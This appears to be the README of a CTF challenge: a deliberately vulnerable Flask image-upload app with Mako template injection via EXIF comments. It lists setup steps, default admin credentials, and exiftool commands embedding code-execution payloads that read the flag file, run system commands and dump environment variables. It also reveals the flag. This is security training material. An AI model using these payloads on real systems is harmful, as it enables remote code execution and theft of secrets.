# CTF Govware2 - Image Upload Challenge

This is a CTF challenge featuring a Flask web application with multiple security vulnerabilities including Server-Side Template Injection (SSTI) in EXIF data processing and authentication bypass opportunities.

## Features

- **User Authentication System**: Login/registration with session management
- **Image Upload Functionality**: Support for PNG, JPG, JPEG, and SVG files
- **EXIF Data Processing**: Extracts and displays image metadata
- **Admin Dashboard**: Administrative interface for privileged users
- **Docker Support**: Containerized deployment with Docker and Docker Compose

## Setup

### Using Docker Compose (Recommended)
```bash
docker-compose up --build
```

### Using Docker directly
```bash
docker build -t ctf_govware2-web .
docker run -d --name upload_image_app -p 5001:5000 ctf_govware2-web
```

The application will be available at `http://localhost:5001`

## Application Structure

- **Login/Registration**: `/login` and `/register` endpoints
- **User Dashboard**: `/user_dashboard` for authenticated users
- **Admin Dashboard**: `/admin_dashboard` for admin users
- **Secret Page**: `/secret` - publicly accessible easter egg
- **Image Upload**: Main functionality accessible after authentication

## Default Credentials

- **Admin User**: `admin` / `admin123`

## Vulnerability Details

### 1. Server-Side Template Injection (SSTI)
The application has a critical SSTI vulnerability in the EXIF data processing. When an image is uploaded, the application extracts EXIF data and renders it using Mako templates without proper sanitization.

### 2. Session Management
The application uses custom session cookie encoding that may have implementation weaknesses.

## Exploitation

### SSTI Exploitation Steps:

1. **Register/Login** to the application
2. **Create a malicious image** with EXIF data containing Mako template injection payload
3. **Upload the image** through the web interface
4. **View the processed EXIF data** where the payload will be executed

### Example Payload Injection:
```bash
# Install exiftool if not available
brew install exiftool  # macOS
# or
apt-get install libimage-exiftool-perl  # Ubuntu/Debian

# Inject malicious payload into image EXIF data
exiftool -Comment='${"__import__(\"os\").popen(\"cat /home/www/flag.txt\").read()}' image.jpg
```

### Alternative Payloads:
```bash
# Read flag file
exiftool -Comment='${open("/home/www/flag.txt").read()}' image.jpg

# Execute system commands
exiftool -Comment='${"__import__(\"subprocess\").check_output([\"ls\", \"-la\", \"/home/www\"]).decode()}' image.jpg

# Environment variable access
exiftool -Comment='${"__import__(\"os\").environ}' image.jpg
```

## Flag Information

- **Flag Location**: `/home/www/flag.txt`
- **Flag Format**: `BCTF{Y0U_C4NNOt_F0o1_Y()uR531F}`
- **Access**: Requires exploitation of the SSTI vulnerability

## File Structure

```
CTF_GOVWARE2/
├── app.py                 # Main Flask application
├── Dockerfile            # Docker container configuration
├── docker-compose.yml    # Docker Compose setup
├── requirements.txt      # Python dependencies
├── ssti_payloads.txt     # Sample SSTI payloads
├── uploads/              # Directory for uploaded images
└── README.md            # This file
```

## Security Notes

⚠️ **Warning**: This application is intentionally vulnerable and should only be used for:
- Educational purposes
- CTF competitions
- Security training in controlled environments

**Do not deploy this application in production or on public networks.**

## Dependencies

- Flask
- Pillow (PIL)
- Mako
- Werkzeug

## License

This project is for educational purposes only. Use responsibly.